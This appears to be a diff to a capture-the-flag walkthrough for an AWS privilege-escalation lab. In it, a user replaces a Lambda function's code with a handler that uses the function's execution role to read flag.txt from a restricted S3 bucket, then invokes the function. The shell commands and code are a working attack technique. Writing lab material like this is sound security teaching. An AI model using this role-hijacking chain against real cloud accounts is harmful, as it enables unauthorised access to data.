@@ -85,23 +85,26 @@ This backup is important: it lets the cleanup script restore the function to its
 
 ### Step 2: Write the malicious payload
 
-Create the handler file. The filename **must** be `lambda_function.py` to match the `lambda_function.lambda_handler` handler:
+Create the handler file. The filename **must** be `lambda_function.py` to match the `lambda_function.lambda_handler` handler. Your starting user has no S3 permissions, so the bucket name comes from the platform, not the API -- take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`) next to your terminal before writing the handler. The bucket name is baked into the handler at write time: the heredoc's `EOF` is deliberately unquoted, so the shell expands your `TARGET_BUCKET` value into the code before it is zipped. That keeps the invocation payload empty — the player terminal's AWS CLI v2 rejects a raw JSON `--payload`, so the bucket travels inside the function instead of the event:
 
 ```bash
-cat > /tmp/lambda_function.py << 'EOF'
+TARGET_BUCKET=<paste the target_bucket_name output here>
+
+cat > /tmp/lambda_function.py << EOF
 import boto3
 import json
+import os
 
 def lambda_handler(event, context):
     s3 = boto3.client('s3')
-    bucket = event.get('bucket')
+    bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
     response = s3.get_object(Bucket=bucket, Key='flag.txt')
     flag = response['Body'].read().decode('utf-8')
     return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
 EOF
 ```
 
-This function reads `flag.txt` from whatever bucket name you pass in via the event payload and returns the contents in the JSON response body. It uses the execution role's identity implicitly — when Lambda runs this code, it injects credentials for `pl-prod-lambda-003-to-bucket-target-role` automatically, so the `boto3.client('s3')` call inherits that role's S3 permissions without any explicit credential configuration.
+This function reads `flag.txt` from the bucket baked into it at write time — the function's pre-set `TARGET_BUCKET` environment variable takes precedence when present — and returns the contents in the JSON response body. It uses the execution role's identity implicitly — when Lambda runs this code, it injects credentials for `pl-prod-lambda-003-to-bucket-target-role` automatically, so the `boto3.client('s3')` call inherits that role's S3 permissions without any explicit credential configuration.
 
 ### Step 3: Package and deploy
 
@@ -124,20 +127,12 @@ aws lambda get-function-configuration \
 
 ### Step 4: Invoke the function
 
-You need the target bucket name. If you did not note it during reconnaissance, find it now:
-
-```bash
-aws s3api list-buckets \
-  --query "Buckets[?starts_with(Name, 'pl-prod-lambda-003-to-bucket-')].Name" \
-  --output text
-```
-
-Then invoke the function, passing the bucket name in the event payload:
+The handler already knows where to look for `flag.txt` — your `TARGET_BUCKET` was baked into it in Step 2 — so the invocation payload is empty:
 
 ```bash
 aws lambda invoke \
   --function-name pl-prod-lambda-003-to-bucket-target-lambda \
-  --payload "{\"bucket\": \"<bucket-name>\"}" \
+  --payload '{}' \
   /tmp/lambda-003-response.json
 
 cat /tmp/lambda-003-response.json
@@ -167,7 +162,7 @@ The flag is stored as `flag.txt` in the target S3 bucket. You retrieved it in th
 To retrieve it directly from S3 (confirming the end-to-end bucket access), note that the flag is accessible through the Lambda execution role path you just established. The starting user still cannot reach the bucket directly:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-003-to-bucket-{account_id}-{resource_suffix}/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
 # AccessDenied -- the starting user still has no direct S3 permissions
 ```
 
